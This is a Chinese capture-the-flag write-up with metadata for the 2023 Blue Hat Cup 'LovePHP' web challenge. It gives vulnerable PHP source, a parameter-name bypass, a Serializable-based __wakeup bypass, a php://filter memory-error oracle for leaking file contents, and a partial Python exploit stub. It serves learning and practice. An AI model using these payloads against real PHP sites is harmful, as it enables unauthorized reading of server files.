---
title: 第七届蓝帽杯全国大学生网络安全技能大赛初赛Writeup
contest: 第七届蓝帽杯初赛
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [蓝帽杯, LovePHP反序列化, file($_GET['secret']), my[secret.flag绕过[, __wakeup绕过, Serializable接口, php://filter字符oracle]
attack_chain: ?my[secret.flag= (绕过[变_)→C:8:"Saferman":0:{} (Serializable接口绕过__wakeup)→file($_GET['secret'])→php://filter字符oracle爆flag
key_payload: "my[secret.flag绕过[;C:8:\"Saferman\":0:{} Serializable接口绕过__wakeup;file($_GET['secret']);php://filter convert.iconv.L1.UCS-4LE爆字符串长度"
one_liner: 第七届蓝帽杯初赛LovePHP：my[secret.flag绕过+Serializable接口绕过__wakeup+php://filter字符oracle
lesson: GET参数名中[被替换为_→用my[secret.flag绕过；Serializable接口类不再支持__wakeup
quality: high
---

# 第七届蓝帽杯全国大学生网络安全技能大赛初赛Writeup

**赛事**：第七届蓝帽杯初赛（2023）

**Web-LovePHP**：

**源码**：
```php
<?php
class Saferman {
    public $check = True;
    public function __destruct() {
        if ($this->check === True) {
            file($_GET['secret']);
        }
    }
    public function __wakeup() {
        $this->check = False;
    }
}
if (isset($_GET['my_secret.flag'])) {
    unserialize($_GET['my_secret.flag']);
} else {
    highlight_file(__FILE__);
}
```

**关键绕过**：

**1. GET参数名[变_ 绕过**：
- `my_secret.flag` 在GET/POST中 `[` 被替换为 `_`
- 使用 `my[secret.flag` 绕过
- 入口：`?my[secret.flag=...`

**2. __wakeup绕过**：
- 反序列化触发 `__wakeup()` 会把 check 置为 False
- 使用 **Serializable接口**绕过：
  - 实现 Serializable 接口的类 **不再支持 __wakeup()**
  - 序列化格式变为 `C:8:"Saferman":0:{}`
  - `C` 代表 Serializable 接口实现

**3. file()函数利用**：
- `file($_GET['secret'])` 把文件读为数组
- 利用 `php://filter` 流

**4. php://filter字符oracle（重要技巧）**：
```python
# THE GRAND IDEA:
# 用 PHP memory limit 作为错误 oracle
# 反复应用 convert.iconv.L1.UCS-4LE filter 每次使字符串长度×4
# 非空字符串会快速触发 500 错误
# 空字符串则不触发 → oracle 知道是否为空

# THE GRAND IDEA 2:
# dechunk filter 行为：
# 字符串无换行时，如果以A-Fa-f0-9开头会清空整个字符串
# 否则保持不变
# 与上面的oracle完美配合
```

**完整EXP**：
```python
import requests
import sys
from base64 import b64decode

def oracle(payload):
    r = requests.get(f"http://target/?my[secret.flag={C_payload}&secret=php://filter/...{payload}")
    if "500" in r.text: return False  # 非空
    else: return True  # 空
```

**核心技术**：
- GET参数名特殊字符绕过（`[` → `_`）
- **Serializable接口特性**绕过 `__wakeup`
- file() + php://filter 利用
- convert.iconv.L1.UCS-4LE 字符oracle
- dechunk filter 清空特性

**质量评估**：高（完整利用链 + 4个关键技巧）
